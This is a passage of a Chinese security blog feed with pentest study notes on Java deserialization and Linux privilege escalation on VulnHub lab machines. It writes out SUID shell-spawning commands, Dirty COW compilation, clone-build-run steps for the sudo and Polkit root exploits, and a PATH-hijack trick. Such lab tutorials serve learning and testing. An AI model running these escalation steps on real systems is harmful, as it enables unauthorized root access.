Person 对象的方法</span><br>        calc.Rce();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 反序列化</title>
    <link href="/2023/07/31/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/07/31/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化"><a href="#Java-反序列化" class="headerlink" title="Java 反序列化"></a>Java 反序列化</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>序列化是将对象转换成数据字节流，反序列化时将数据字节流转换为对象。</p><p>序列化的是为了进程之间对象的传递。发送方将对象序列化为字节流，接收方从字节序列中恢复出对象完成传递。</p><p>在 Java 中，要对一个对象进行序列化，其必须实现 <code>Serializable</code> 接口。</p><p>接口 <code>Serializable</code> 用来标识当前类可以被 <code>ObjectOutputStream</code> 序列化，以及被 <code>ObjectInputStream</code> 反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">// Person 类实现 Serializable 接口, 空接口, 不需要实现方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;name:&quot;</span>+ name);<br>        System.out.println(<span class="hljs-string">&quot;age:&quot;</span>+ age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;fuming&quot;</span>,<span class="hljs-number">18</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建一个输出流来写入文件</span><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.ser&quot;</span>);<br>            <span class="hljs-comment">// 创建一个对象输出流</span><br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOut);<br>            <span class="hljs-comment">// 序列化对象</span><br>            out.writeObject(person);<br>            <span class="hljs-comment">// 关闭流</span><br>            out.close();<br>            fileOut.close();<br>            System.out.println(<span class="hljs-string">&quot;对象已经被序列化并保存在 person.ser 文件中&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里将序列化的对象写入文件流中，<code>.ser</code> 用来表示这是一个序列化文件。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>创建一个输入流，读取序列化文件，然后将字节流反序列化为对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeserializeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建一个输入流来读取文件</span><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;person.ser&quot;</span>);<br>            <span class="hljs-comment">// 创建一个对象输入流</span><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileIn);<br>            <span class="hljs-comment">// 反序列化对象</span><br>            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) in.readObject();<br>            <span class="hljs-comment">// 关闭流</span><br>            in.close();<br>            fileIn.close();<br>            <span class="hljs-comment">// 输出反序列化后的对象</span><br>            person.print();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Java 反序列化漏洞跟 PHP 其实是一样的，或者说反序列化漏洞的成因都是一样的：应用程序对攻击者可控的数据进行反序列化操作。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>黑盒测试可以通过 Java 反序列化特征自己或字符串：</p><ul><li>Base64 ：<code>rO0AB</code></li><li>16 进制：<code>0xac ed 00 05</code></li></ul><p>白盒测试可直接搜索 <code>readObject</code> 方法，再看其输入是否可控。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Java 反序列化漏洞的利用往往需要组合多个不同的 <code>Serializable</code> 接口实现类的方法调用，形成复杂的调用链。</p><p>在 Java 安全领域，习惯称之为反序列化利用链，也叫 <code>Gadget Chain</code>。</p><p>前人已经挖掘出了很多的利用链，他们对 Java 标准库以及各种常见的第三方库组件做了大量研究，最终找到了许多可以实现远程代码执行的反序列化利用链，这些利用链以及集成到了著名的 Java 反序列化利用工具 <code>ysoserial</code> 中。</p><p>项目地址：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux 提权</title>
    <link href="/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-提权"><a href="#Linux-提权" class="headerlink" title="Linux 提权"></a>Linux 提权</h1><h2 id="辅助项目"><a href="#辅助项目" class="headerlink" title="辅助项目"></a>辅助项目</h2><p>辅助网站：</p><ol><li>Linux：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li><li>Windows：<a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></li></ol><p>综合类探针：<a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><p>自动化提权：<a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a></p><p>信息收集：</p><ol><li><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a> -&gt; shell -&gt; 系统&#x2F;用户&#x2F;特权访问&#x2F;环境&#x2F;工作任务&#x2F;版本&#x2F;弱口令&#x2F;文件(SUID&#x2F;GUID…)&#x2F;平台</li><li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a> -&gt; python</li></ol><p>漏洞探针：</p><ol><li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></li></ol><p>Shell反弹生成：</p><ol><li><p><a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p></li><li><p><a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p></li></ol><p>SUID命令执行参考：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。</p><p>在 Linux&#x2F;Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID 被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。简而言之用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p><p>提权原理：ROOT 用户为某些可执行文件增加了 S 权限（ SUID ），那么在我们在调用这个可执行文件时，将获取这个文件所有者的权限（ ROOT ）的权限。当该可执行文件拥有执行系统命令的功能时，我们就可以实现权限提升。</p><p>chmod u+s &#x2F;usr&#x2F;bin&#x2F;find -&gt; 设置SUID权限</p><p>手工命令探针安全：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>通过工具寻找 SUID：</p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>常见的SUID提权文件：( 存在SUID权限代表这就可以进行提权，还要看其命令是否存在可以利用的点(执行系统命令…))</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span>、<span class="hljs-keyword">vim</span>、<span class="hljs-keyword">find</span>、more、less、bash、<span class="hljs-keyword">cp</span>、Nano、mv、awk、man、weget<br></code></pre></td></tr></table></figure><p>比如 find 命令：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224200446753.png" alt="image-20230224200446753"></p><p>存在 -exec COMMAND 参数可以去执行命令。</p><p>SUID命令执行参考：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><h3 id="2-实操"><a href="#2-实操" class="headerlink" title="2.实操"></a>2.实操</h3><p>拿到 webshell 权限：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224201946839.png" alt="image-20230224201946839"></p><p>手工找下 SUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224202127565.png" alt="image-20230224202127565"></p><p>其中存在 find 命令：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> . -exec <span class="hljs-regexp">/bin/</span>sh -p \;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224202835896.png" alt="image-20230224202835896"></p><p>使用工具：</p><p>上传 LinEnum 并执行：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224203416789.png" alt="image-20230224203416789"></p><p>它直接告诉我们 find 命令可以使用。而不需要再去筛选。</p><h2 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h2><h3 id="1-介绍-1"><a href="#1-介绍-1" class="headerlink" title="1.介绍"></a>1.介绍</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>内核溢出漏洞，和 windows 相似。</p><p>利用系统内核找到符合的漏洞，使用EXP进行提权。</p><p>与 windows 不同之处：</p><ul><li>windows 中大部分的溢出漏洞可以适用于服务权限而非必须本地用户，而 linux 中却是有许多需要本地用户权限</li><li>Linux 中的EXP一般是 c、cpp 的形式，需要上传后再次进行编译</li></ul><p>目前较为常用的溢出漏洞：</p><ul><li>脏牛漏洞（ CVE-2016-5195 ）</li><li>Dirty Pipe（ CVE-2022-0847 ）</li><li>SUDO（ CVE-2021-3156 ）</li><li>Polkit（ CVE-2021-4034）</li></ul><h4 id="2-查找"><a href="#2-查找" class="headerlink" title="2.查找"></a>2.查找</h4><p>如何查找符合系统的溢出漏洞：</p><p>uname -a : 查看系统内核信息</p><p>searchsploit : 一款漏洞查找工具</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224204304516.png" alt="image-20230224204304516"></p><p>searchsploit 参数：</p><ul><li>-c, –case     [Term]      区分大小写(默认不区分大小写)</li><li>-e, –exact    [Term]      对exploit标题进行EXACT匹配 (默认为 AND) [Implies “-t”].</li><li>-h, –help                 显示帮助</li><li>-j, –json     [Term]      以JSON格式显示结果</li><li>-m, –mirror   [EDB-ID]    把一个exp拷贝到当前工作目录,参数后加目标id</li><li>-o, –overflow [Term]      Exploit标题被允许溢出其列</li><li>-p, –path     [EDB-ID]    显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号</li><li>-t, –title    [Term]      仅仅搜索漏洞标题（默认是标题和文件的路径）</li><li>-u, –update               检查并安装任何exploitdb软件包更新（deb或git）</li><li>-w, –www      [Term]      显示Exploit-DB.com的URL而不是本地路径（在线搜索）</li><li>-x, –examine  [EDB-ID]    使用$ PAGER检查（副本）Exp</li><li>–colour               搜索结果不高亮显示关键词</li><li>–id                   显示EDB-ID</li><li>–nmap     [file.xml]  使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）</li><li>–exclude&#x3D;”term”       从结果中删除值。通过使用“|”分隔多个值(例如–exclude&#x3D;“term1 | term2 | term3”。)</li></ul><p>自动筛选工具：</p><ol><li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></li><li><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></li><li><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a></li></ol><p>linux-exploit-suggester：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224204603441.png" alt="image-20230224204603441"></p><h4 id="3-编译"><a href="#3-编译" class="headerlink" title="3.编译"></a>3.编译</h4><p>c ：<code>gcc aaa.c exp</code></p><p>cpp：<code>g++ 40847.cpp -o exp</code></p><h3 id="2-脏牛"><a href="#2-脏牛" class="headerlink" title="2.脏牛"></a>2.脏牛</h3><p>靶机地址：<a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><p>上传 linux-exploit-suggester 进行漏洞发现：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224181452207.png" alt="image-20230224181452207"></p><p>出来一堆，找找认识的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224185034099.png" alt="image-20230224185034099"></p><p>存在脏牛漏洞，那么就使用它进行提权：</p><p>下载上传：<a href="https://www.exploit-db.com/download/40847">https://www.exploit-db.com/download/40847</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224184514553.png" alt="image-20230224184514553"></p><p>编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil<br></code></pre></td></tr></table></figure><ul><li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li><li>-pedantic 允许发出ANSI&#x2F;ISO C标准所列出的所有警告</li><li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li><li>-std&#x3D;c++11就是用按C++2011标准来编译的</li><li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li><li>-o dcow gcc生成的目标文件,名字为dcow</li></ul><p>编译完成后运行 dcow ：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224184632713.png" alt="image-20230224184632713"></p><p>生成了新的密码，ssh 登录一下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230224184720802.png" alt="image-20230224184720802"></p><p>提权成功。</p><h3 id="3-SUDO"><a href="#3-SUDO" class="headerlink" title="3.SUDO"></a>3.SUDO</h3><h4 id="1-介绍-2"><a href="#1-介绍-2" class="headerlink" title="1.介绍"></a>1.介绍</h4><p>一个类 Unix 操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。</p><p>当 sudo 通过 -s 或 -i 命令行选项在 shell 模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。</p><p>但使用 -s 或 -i 标志运行 sudoedit 时，实际上并未进行转义，从而可能导致缓冲区溢出。</p><p>只要存在 sudoers 文件（通常是 &#x2F;etc&#x2F;sudoers），攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。</p><h4 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h4><p>sudo: 1.8.2 - 1.8.31p2</p><p>sudo: 1.9.0 - 1.9.5p1</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h4 id="3-漏洞判断"><a href="#3-漏洞判断" class="headerlink" title="3.漏洞判断"></a>3.漏洞判断</h4><p>以非 root 用户登录系统，并使用命令 <code>sudoedit -s /</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudoedit</span> -s /<br></code></pre></td></tr></table></figure><ul><li>如果响应一个以 <code>sudoedit:</code> 开头的报错，那么表明存在漏洞。</li><li>如果响应一个以 <code>usage:</code>开头的报错，那么表明补丁已经生效。</li></ul><p>如下则表示存在漏洞：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402215406579.png" alt="image-20230402215406579"></p><h4 id="4-利用"><a href="#4-利用" class="headerlink" title="4.利用"></a>4.利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/blasty/CVE-2021-3156.git<br><br><span class="hljs-built_in">cd</span> CVE-2021-3156<br><br>make<br><br><span class="hljs-built_in">chmod</span> a+x sudo-hax-me-a-sandwich<br><br>./sudo-hax-me-a-sandwich 1<br></code></pre></td></tr></table></figure><h3 id="4-Polkit"><a href="#4-Polkit" class="headerlink" title="4.Polkit"></a>4.Polkit</h3><h4 id="1-介绍-3"><a href="#1-介绍-3" class="headerlink" title="1.介绍"></a>1.介绍</h4><p>Polkit（PolicyKit）是一个用于在类Unix操作系统中控制系统范围权限的组件。pkexec是Plokit框架中的一部分，执行具有提升权限的命令，是sudo的替代方案。</p><h4 id="2-影响版本-1"><a href="#2-影响版本-1" class="headerlink" title="2.影响版本"></a>2.影响版本</h4><p>不受影响的版本：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs subunit">CentOS：<br>· CentOS 6：polkit<span class="hljs-string">-0</span>.96<span class="hljs-string">-11</span>.el6_10.2<br>· CentOS 7：polkit<span class="hljs-string">-0</span>.112<span class="hljs-string">-26</span>.el7_9.1<br>· CentOS 8.0：polkit<span class="hljs-string">-0</span>.115<span class="hljs-string">-13</span>.el8_5.1<br>· CentOS 8.2：polkit<span class="hljs-string">-0</span>.115<span class="hljs-string">-11</span>.el8_2.2<br>· CentOS 8.4：polkit<span class="hljs-string">-0</span>.115<span class="hljs-string">-11</span>.el8_4.2<br>Ubuntu：<br>· Ubuntu 14.04 ESM：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-4</span>ubuntu3.14.04.6+esm1<br>· Ubuntu 16.04 ESM：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-14</span>.1ubuntu0.5+esm1<br>· Ubuntu 18.04 LTS：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-20</span>ubuntu0.18.04.6<br>· Ubuntu 20.04 LTS：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-26</span>ubuntu1.2<br>· Ubuntu 21.10：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-31</span>ubuntu0.1<br>Debain：<br>· ：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-18</span>+deb9u2<br>· Debain stretch：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-18</span>+deb9u2<br>· Debain buster：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-25</span>+deb10u1<br>· Debain bullseye：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-31</span>+deb11u1<br>· Debain bookworm,bullseye：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-31</span>.1<br></code></pre></td></tr></table></figure><p>查看版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">CentOS</span><br>rpm -qa polkit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Ubuntu</span><br>dpkg -l policykit-1<br></code></pre></td></tr></table></figure><p>如下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402222805447.png" alt="image-20230402222805447"></p><h4 id="3-利用"><a href="#3-利用" class="headerlink" title="3.利用"></a>3.利用</h4><p>EXP：</p><ul><li><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a> [最简单]</li><li><a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></li><li><a href="https://github.com/dzonerzy/poc-cve-2021-4034">https://github.com/dzonerzy/poc-cve-2021-4034</a> [需要go环境]</li></ul><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">git clone https://gitclone.com/github.com/berdav/CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>.git <br>cd CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>/<br>make<br>./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span><br></code></pre></td></tr></table></figure><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="1-介绍-4"><a href="#1-介绍-4" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>环境变量：</p><p>在使用 ps 命令时，我们当前目录并没有 ps 的可执行文件，那么为什么可以直接执行？</p><p>ps 可执行文件的位置：&#x2F;usr&#x2F;bin&#x2F;ps，而 &#x2F;usr&#x2F;bin 目录是 Linux 中的环境变量，所以 ps 可用直接调用 &#x2F;usr&#x2F;bin&#x2F;ps ，这是环境变量的作用。</p><p>Linux 中，调用命令时，现在环境变量中找有没有可执行文件，环境变量没有再找当前目录对应的程序名。</p><p>环境变量提权：</p><ol><li>寻找有SUID权限的用户自定义的可执行文件</li><li>查看这个可执行文件是做什么的，它有没有调用一些环境变量中的程序</li><li>如果它调用了环境变量中的程序，那我们首先增加一个环境变量，再使用一个我们的程序( 实现其他功能 )放到自定义的环境变量中</li><li>当可执行文件调用这个程序时，优先在我们自定义的环境变量里面去寻找，而非之前的环境变量</li></ol><p>修改环境变量：<a href="https://cloud.tencent.com/developer/article/1640616">https://cloud.tencent.com/developer/article/1640616</a></p><p>利用流程：</p><ol><li>寻找 SUID 中的自定义程序</li><li>分析程序，查看是否调用环境变量命令</li><li>添加环境变量</li><li>修改目标调用环境变量为 SUID 提权命令（ find bash…）</li></ol><h3 id="2-实操-1"><a href="#2-实操-1" class="headerlink" title="2.实操"></a>2.实操</h3><p>靶机地址：<a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></p><p>上传 LinEnum 到 tmp 进行信息收集：</p><p>SUID：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402180123327.png" alt="image-20230402180123327"></p><p>SUID 没有可以直接提权的文件，SUID 提权文件如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span>、<span class="hljs-keyword">vim</span>、<span class="hljs-keyword">find</span>、more、less、bash、<span class="hljs-keyword">cp</span>、Nano、mv、awk、man、weget<br></code></pre></td></tr></table></figure><p>但发现了一个用户自定义的SUID文件 <code>/home/john/toto</code> ：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402194909194.png" alt="image-20230402194909194"></p><p>可以看到 <code>/home/john/toto</code> 的执行结果应该是以<code>john</code>用户的身份执行了一个<code>id</code>命令。</p><p>可以通过环境变量替换id进行提权到<code>john</code>用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp /usr/bin/bash /tmp/id# bash 替换 假id<br>chmod +x /tmp/id# 可执行权限<br>export PATH=/tmp:$PATH# 添加tmp目录到环境变量<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402223541855.png" 